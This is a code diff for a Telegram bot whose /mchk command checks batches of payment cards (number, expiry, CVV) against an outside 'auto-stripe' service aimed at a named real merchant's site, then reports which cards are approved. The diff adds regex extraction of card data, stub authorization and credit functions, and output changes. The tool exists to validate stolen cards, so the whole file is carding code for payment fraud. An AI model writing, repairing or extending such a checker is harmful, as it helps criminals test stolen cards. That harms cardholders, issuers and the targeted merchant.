@@ -794,29 +794,33 @@ async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 import time
 import aiohttp
+import re
 from telegram import Update
 from telegram.constants import ParseMode
 from telegram.helpers import escape_markdown
 from telegram.ext import Application, CommandHandler, ContextTypes
 
-# This function creates the stylish, bolded italic text using Unicode characters.
-# It is now used to format the card status response.
-def format_stylish_text(text):
-    """Converts text to a specific stylish, bolded italic Unicode font."""
-    unicode_map = {
-        'A': '𝘈', 'B': '𝘉', 'C': '𝘊', 'D': '𝘋', 'E': '𝘌', 'F': '𝘍', 'G': '𝘎',
-        'H': '𝘏', 'I': '𝘐', 'J': '𝘑', 'K': '𝘒', 'L': '𝘓', 'M': '𝘔', 'N': '𝘕',
-        'O': '𝘖', 'P': '𝘗', 'Q': '𝘲', 'R': '𝘙', 'S': '𝙎', 'T': '𝘛', 'U': '𝘜',
-        'V': '𝘝', 'W': '𝘞', 'X': '𝘟', 'Y': '𝘠', 'Z': '𝘡', 'a': '𝘢', 'b': '𝘣',
-        'c': '𝘤', 'd': '𝘥', 'e': '𝘦', 'f': '𝘧', 'g': '𝘨', 'h': '𝘩', 'i': '𝘪',
-        'j': '𝘫', 'k': '𝘬', 'l': '𝘭', 'm': '𝘮', 'n': '𝘯', 'o': '𝘰', 'p': '𝘱',
-        'q': '𝘲', 'r': '𝘳', 's': '𝘴', 't': '𝘵', 'u': '𝘶', 'v': '𝘷', 'w': '𝘸',
-        'x': '𝘹', 'y': '𝘺', 'z': '𝘻', ' ': ' '
-    }
-    formatted_text = ""
-    for char in text:
-        formatted_text += unicode_map.get(char, char)
-    return formatted_text
+# Placeholder functions that must be implemented for the bot to run.
+# You will need to fill in the actual logic for these.
+async def check_authorization(update, context):
+    """Placeholder to check if a user is authorized. Always returns True for this example."""
+    return True
+
+async def enforce_cooldown(user_id, update):
+    """Placeholder to enforce a cooldown on the command."""
+    return True
+
+async def get_user(user_id):
+    """Placeholder to get user data from a database or storage."""
+    return {"credits": 100}  # Example user with 100 credits
+
+async def consume_credit(user_id):
+    """Placeholder to consume one credit from a user."""
+    return True
+
+async def get_bin_details(bin_number):
+    """Placeholder to get BIN details from an external API."""
+    return {} # Example placeholder
 
 async def mchk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Checks multiple cards on the same API with a detailed summary at the end."""
@@ -837,55 +841,43 @@ async def mchk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not await enforce_cooldown(user_id, update):
         return
 
-    # --- Start of updated input parsing logic ---
     raw_cards = ""
-    # Check if the command has arguments (cards on the same line)
     if context.args:
         raw_cards = ' '.join(context.args)
-    # If no arguments, check if it's a reply to a message containing cards
     elif update.effective_message.reply_to_message and update.effective_message.reply_to_message.text:
         raw_cards = update.effective_message.reply_to_message.text
 
-    # If no cards are found, send usage message
     if not raw_cards:
         return await update.effective_message.reply_text(
             "Usage: /mchk number|mm|yy|cvv",
             parse_mode=None
         )
 
-    card_lines = [line.strip() for line in raw_cards.splitlines() if line.strip()]
+    # Use a regex to find all valid card formats
+    card_pattern = re.compile(r"(\d{13,16}\|\d{1,2}\|(?:\d{2}|\d{4})\|\d{3,4})")
+    card_lines = card_pattern.findall(raw_cards)
 
     if not card_lines:
         return await update.effective_message.reply_text(
-            "Invalid format. Please provide at least one card on a separate line.",
+            "Invalid format. Please provide at least one card in the format: number|mm|yy|cvv.",
             parse_mode=None
         )
     
     cards_to_check = card_lines
-    # Handle the case where more than 10 cards are provided
     if len(card_lines) > 10:
-        await update.effective_message.reply_text("Only the first 10 cards are allowed. Checking these now.")
+        await update.effective_message.reply_text("Only 10 cards are allowed. Checking the first 10 now.")
         cards_to_check = card_lines[:10]
-    # --- End of updated input parsing logic ---
     
     total_cards = len(cards_to_check)
+    approved_count, declined_count, error_count, checked_count = 0, 0, 0, 0
     
-    # Initialize counters for the summary
-    approved_count = 0
-    declined_count = 0
-    error_count = 0
-    checked_count = 0
-    
-    # Send initial message with a processing header
     processing_text = "Processing..."
     processing_msg = await update.effective_message.reply_text(processing_text, parse_mode=None)
     
     start_time = time.time()
     results = []
     
-    # Loop through and process each card
     for i, raw in enumerate(cards_to_check):
-        # Load user data and check for credits
         user_data = await get_user(user_id)
         if user_data.get('credits', 0) <= 0:
             results.append("❌ Out of credits.")
@@ -893,25 +885,10 @@ async def mchk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             break
             
         parts = raw.split("|")
-        if len(parts) != 4:
-            results.append(f"❌ Invalid format for card {raw}.")
-            error_count += 1
-            checked_count += 1
-            continue
-
         # Normalize year to 2 digits
         if len(parts[2]) == 4:
             parts[2] = parts[2][-2:]
         cc_normalized = "|".join(parts)
-
-        # BIN lookup
-        bin_number = parts[0][:6]
-        bin_details = await get_bin_details(bin_number)
-        if bin_details is None:
-            bin_details = {}
-        brand = (bin_details.get("scheme") or "N/A").upper()
-        issuer = (bin_details.get("type") or "N/A").upper()
-        country_name = (bin_details.get("country_name") or "N/A").upper()
 
         # Deduct credit
         if not await consume_credit(user_id):
@@ -919,7 +896,6 @@ async def mchk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             error_count += 1
             break
         
-        # Darkboy API call
         api_url = f"https://darkboy-auto-stripe.onrender.com/gateway=autostripe/key=darkboy/site=buildersdiscountwarehouse.com.au/cc={cc_normalized}"
         try:
             async with aiohttp.ClientSession() as session:
@@ -928,14 +904,13 @@ async def mchk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
                         raise Exception(f"HTTP {resp.status}")
                     data = await resp.json()
         except Exception as e:
-            results.append(f"❌ API Error for card {raw}: {str(e)}")
+            results.append(f"❌ API Error for card `{raw}`: {str(e)}")
             error_count += 1
             checked_count += 1
             
-            # Update the message with the current progress
             current_time_taken = round(time.time() - start_time, 2)
             current_summary = (
-                f"✧ 𝐓�𝐭𝐚𝐥↣{total_cards}\n"
+                f"✧ 𝐓𝐨𝐭𝐚𝐥↣{total_cards}\n"
                 f"✧ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝↣{checked_count}\n"
                 f"✧ 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝↣{approved_count}\n"
                 f"✧ 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝↣{declined_count}\n"
@@ -946,14 +921,12 @@ async def mchk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             )
             current_results = "\n──────── ⸙ ─────────\n".join(results)
             await processing_msg.edit_text(current_summary + "\n\n" + current_results, parse_mode=None)
-
             continue
 
         api_status = (data.get("status") or "Unknown").title()
         api_response = data.get("response") or "N/A"
 
-        # --- Start of updated emoji logic ---
-        emoji = "❓"  # Default emoji for unknown/error status
+        emoji = "❓"
         if api_status.lower() == "approved":
             approved_count += 1
             emoji = "✅"
@@ -963,18 +936,17 @@ async def mchk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         else:
             error_count += 1
         checked_count += 1
-        # --- End of updated emoji logic ---
         
-        # The response is now formatted with the stylish font.
-        formatted_response = format_stylish_text(api_response)
+        formatted_response = api_response
 
         card_result = (
+            f"```\n"
             f"{cc_normalized}\n"
             f"𝐒𝐭𝐚𝐭𝐮𝐬➳ {emoji} {formatted_response}"
+            f"```"
         )
         results.append(card_result)
         
-        # Update the message with the current progress
         current_time_taken = round(time.time() - start_time, 2)
         current_summary = (
             f"✧ 𝐓𝐨𝐭𝐚𝐥↣{total_cards}\n"
@@ -989,7 +961,6 @@ async def mchk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         current_results_str = "\n──────── ⸙ ─────────\n".join(results)
         await processing_msg.edit_text(current_summary + "\n\n" + current_results_str, parse_mode=None)
 
-    # Final update after all cards are processed
     final_time_taken = round(time.time() - start_time, 2)
     final_summary = (
         f"✧ 𝐓𝐨𝐭𝐚𝐥↣{total_cards}\n"
